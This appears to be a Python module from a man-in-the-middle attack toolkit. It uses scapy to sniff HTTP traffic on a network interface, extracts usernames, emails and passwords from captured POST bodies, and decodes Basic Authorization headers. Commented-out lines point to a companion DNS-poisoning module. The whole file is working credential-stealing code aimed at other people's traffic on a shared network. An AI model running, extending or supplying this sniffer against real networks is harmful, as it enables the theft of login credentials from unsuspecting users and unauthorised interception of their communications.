import pyshark
import threading
import base64

from scapy.all import *
from scapy.layers.http import HTTPRequest
from scapy.layers.dns import DNSRR, DNS, IP, UDP


# from dns_poisoning import process_dns_packet
# from utils import thread_with_trace

from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
RESET = Fore.RESET

def extract_creds(index_to_start_from, given_text):
    extracted_creds = ""
    did_amp_happen = False

    search_from_text = given_text[index_to_start_from:]

    for character in search_from_text:
        if character == "&" and did_amp_happen:
            break
        if character == "&":
            did_amp_happen = True
            continue
        extracted_creds += character

    return extracted_creds


def print_creds_from_packet(request_to_filter_out, printing_queue):
    dictionary_of_keywords = {"email=": -1, "&encpass=": -1, "username=": -1, "&pass=":-1}
    phrases_to_check = dictionary_of_keywords.keys()

    for phrase_to_check in phrases_to_check:
        dictionary_of_keywords[phrase_to_check] = request_to_filter_out.find(phrase_to_check)

    for creds_to_extract in phrases_to_check:
        current_index = dictionary_of_keywords[creds_to_extract]
        if current_index != -1:
            extracted_creds = extract_creds(current_index, request_to_filter_out)
            printing_queue.put(f"{GREEN}[+] Found creds: {extracted_creds}{RESET}")

def format_base64(creds_to_format):
    print(creds_to_format.decode('utf-8')[6:])
    return base64.b64decode(creds_to_format.decode('utf-8')[6:])

def process_http_packet(local_packet, printing_queue, verbosity):
    printing_queue.put(local_packet)

    url = local_packet[HTTPRequest].Host.decode() + local_packet[HTTPRequest].Path.decode()
    ip = local_packet[IP].src
    method = local_packet[HTTPRequest].Method.decode()


    if verbosity > 1:
        printing_queue.put(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
        tcp_layer = local_packet.getlayer("TCP")
        if tcp_layer:
            http_request = local_packet.getlayer("HTTP Request")
            if http_request:
                auth = http_request
                if auth:
                    printing_queue.put(format_base64(auth.Authorization))

    if local_packet.haslayer(Raw) and method == "POST":
        if verbosity > 0:
            printing_queue.put(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
            printing_queue.put(f"\n{BLUE}[?] Some useful Raw data: {local_packet[Raw].load}{RESET}")


def packet_handler(packet_to_process, target, router_ip, printing_queue, verbosity):
    if packet_to_process.haslayer(HTTPRequest):
        # print(packet_to_process)
        process_http_packet(packet_to_process, printing_queue, verbosity)

    # if packet_to_process.haslayer(DNS) and packet_to_process[DNS].qr == 0:
    #     print(packet_to_process)
    # process_dns_packet(packet_to_process, target,router_ip)


def sniffer_loop_scapy(interface_to_capture_packets, target, router_ip, printing_queue, verbosity, cancel_token):
    if verbosity > 0:
        printing_queue.put(f"{GREEN}[+] Starting sniffer{RESET}")
    while not cancel_token.is_set():
        sniff(iface=interface_to_capture_packets,
              prn=lambda packet_to_process: packet_handler(packet_to_process, target, router_ip, printing_queue,
                                                           verbosity),
              store=0, count=1)
    # sniff(prn=process_packet, filter="port 80", store=False)


def start_sniffer_thread(interface_to_capture_packets, target, router_ip, printing_queue, verbosity=0):
    cancel_token = threading.Event()
    sniffer_thread = threading.Thread(target=sniffer_loop_scapy,
                                      args=(
                                          interface_to_capture_packets, target, router_ip, printing_queue, verbosity,
                                          cancel_token))
    sniffer_thread.start()
    return cancel_token

# if __name__ == "__main__":
# sniffer_loop_scapy("wlan0", 1)
# for testing purposes
# sniffer_loop("wlan0",1)
# start_sniffer_thread("wlan0",1)
